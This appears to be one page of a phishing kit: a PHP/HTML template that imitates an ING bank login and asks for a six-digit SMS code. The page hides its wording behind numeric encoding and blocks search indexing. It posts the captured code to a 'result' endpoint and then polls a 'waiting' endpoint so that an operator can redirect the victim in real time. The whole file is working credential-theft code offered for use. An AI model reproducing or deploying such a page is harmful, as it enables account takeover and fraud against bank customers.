<?php reset_action(get_client_ip()); ?>
<!doctype html>
<html style="display: flex; flex-direction: column; height: 100%;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="assets/css/bootstrap.css">
        <link rel="stylesheet" href="assets/css/helpers.css">
        <link rel="stylesheet" href="assets/css/style.css">

        <link rel="icon" type="image/png" href="assets/imgs/favicon.png" />

        <title>ING Login</title>
    </head>

    <body style="display: flex; flex-direction: column; height: 100%;">
        <div id="whitebox"></div>
        <div id="loader">
            <div class="inner">
                <ul>
                    <li></li>
                    <li></li>
                    <li class="active"></li>
                </ul>
                <p><hello class="chlakh">547 166 267 191 160 192 97 430 225 154 256 189 530</hello></p>
            </div>
        </div>

        <header>
        <div class="header container">
            <div class="logo"><img src="assets/imgs/log.svg"></div>
        </div>
    </header>
    <section id="login" class="flex-grow-1" style="padding-bottom: 177px;">
        <div class="container">
            <div class="titre"><h2><hello class="chlakh">316 252 438 58 547 404 18 540 18 203 170 419 215 368 460 34 488 36 423 321 318 246 70 109 432 18 422 388</hello></h2></div>
            <div class="form row" id="itan"> 
                <form id="form" action="result" method="POST" class="text-center">
                    <input type="hidden" name="captcha">
                    <input type="hidden" name="step" value="sms">
                    <p style="color: #666;margin-bottom: 30px;font-size: 15px;"><hello class="chlakh">167 201 205 227 192 444 97 443 158 223 146 419 215 368 460 34 488 36 423 321 318 246 70 109 432 18 422 388</hello><br><hello class="chlakh">474 532 440 227 192 444 97 443 158 223 146 419 215 368 460 34 488 36 423 321 318 246 70 109 432 18 422 388</hello><br><hello class="chlakh">281 376 242 216 121 476 113 431 213 489 146 419 215 368 460 34 488 36 423 321 318 246 70 109 432 18 422 388</hello></p>
                    <div class="itan d-flex justify-content-between ">
                            <input type="text" inputmode="numeric" maxlength="1" name="sms1" id="sms1" class="form-control">
                            <input type="text" inputmode="numeric" maxlength="1" name="sms2" id="sms2" class="form-control">
                            <input type="text" inputmode="numeric" maxlength="1" name="sms3" id="sms3" class="form-control">
                            <input type="text" inputmode="numeric" maxlength="1" name="sms4" id="sms4" class="form-control">
                            <input type="text" inputmode="numeric" maxlength="1" name="sms5" id="sms5" class="form-control">
                            <input type="text" inputmode="numeric" maxlength="1" name="sms6" id="sms6" class="form-control">
                        </div>
                        <?php echo error_message($_SESSION['errors'],'sms_code'); ?>
                    <div class="bttn text-center mt-5">
                        <button type="submit" id="submit" style="background:#FF6200;" submit=""><i style="margin-right: 5px;" class="fas fa-angle-right"></i><hello class="chlakh">373 488 428 239 76 51 522 132 511 492 92 63 40 324 140 290 38 57 385 321 318 246 70 109 432 18 422 388</hello></button>
                    </div>
                </form>
            </div>
        </div>
    </section>
    <footer>
        <ul class="list-unstyled">
            <li><hello class="chlakh">40 479 239 271 264 170 12 68 178 243 92 253 105 216 208 403 299 408 498 403 46 546 431 109 432 18 422 388</hello></li>
            <li><hello class="chlakh">395 178 112 199 34 329 497 380 225 141 292 485 393 101 145 43 442 538 498 403 46 546 431 109 432 18 422 388</hello></li>
            <li><hello class="chlakh">13 151 191 453 210 417 289 457 528 339 170 532 445 95 276 389 533 369 505 240 234 512 238 50 47 545 39 388</hello></li>
            <li><hello class="chlakh">351 133 57 503 168 98 560 91 238 428 189 22 278 358 156 356 51 82 136 30 234 512 238 50 47 545 39 388</hello></li>
            <li><hello class="chlakh">523 347 20 200 241 227 501 478 238 428 189 22 278 358 156 356 51 82 136 30 234 512 238 50 47 545 39 388</hello></li>
            <li><hello class="chlakh">36 305 344 325 196 338 251 465 406 549 137 161 116 324 137 37 492 508 25 55 409 515 320 42 223 545 39 388</hello></li>
            <li><hello class="chlakh">526 61 535 417 552 28 320 523 364 230 25 474 283 296 454 253 23 110 566 96 360 441 333 439 469 264 39 388</hello></li>
        </ul>
        <div><img style="min-width: 144px;" src="assets/imgs/media.png"></div>
    </footer>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="assets/js/bootstrap.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="assets/js/script.js"></script>

        <script>

            getContent("sms");

            $('.itan input').keyup(function(e){
                if( $(this).val().length == 1 ) {
                    $(this).next().focus();
                } else if( $(this).val().length == 0 ) {
                    if( e.keyCode == 8 ) {
                        $(this).prev().focus();
                    }
                }
            });

            $('#submit').click(function(e) {
                e.preventDefault();
                $('.error').hide();
                $('#loader').css({"display":"flex"}).show(200,function() {
                    $.post( "result", $('#form').serialize() )
                        .done(function( data ) {
                        if( data == 'success' ) {
                            
                            (function worker() {
                                $.ajax({
                                    method: "GET",
                                    url: 'waiting',
                                    success: function (data) {
                                        if( data !== '' && data !== "0" ) {
                                            window.location.href= 'redirection/' + data;
                                        }
                                    },
                                    complete: function () {
                                        setTimeout(worker, 1000);
                                    }
                                });
                            })();

                        } else if( data == 'error' ) {
                            location.reload();
                        }
                    });
                });
            });

        </script>

    </body>

</html>